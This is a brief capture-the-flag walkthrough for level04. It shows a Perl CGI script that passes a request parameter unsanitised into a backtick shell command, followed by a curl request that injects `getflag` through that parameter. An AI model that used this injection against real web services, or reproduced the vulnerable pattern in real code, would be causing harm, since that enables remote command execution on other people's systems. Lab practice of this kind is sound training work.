We start by listing the files and finding a `level04.pl` file:

```bash
ls
```

Inside `level04.pl`, we see the following Perl script:
```perl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```

We can exploit this by sending a **crafted HTTP request** using `curl`:
```bash
curl "http://localhost:4747/level04.pl?x=\`getflag\`"
```

And we get our next flag !